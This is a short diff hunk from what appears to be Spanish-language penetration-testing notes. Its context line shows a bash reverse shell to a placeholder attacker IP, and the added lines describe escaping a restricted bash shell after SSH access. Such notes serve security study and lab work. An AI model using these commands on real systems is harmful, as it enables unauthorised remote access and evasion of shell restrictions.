@@ -96,6 +96,10 @@ bash -i >& /dev/tcp/ip_atacante/port 0>&1
 /bin/bash -i
 ```
 
+- Si tenemos una **rbash(restricted bash)** una vez hemos ganado acceso por ssh, únicamente poner bash al final
+```bash
+ssh user@IP bash
+```
 
 - **Desde máquina atacante**
 ```bash
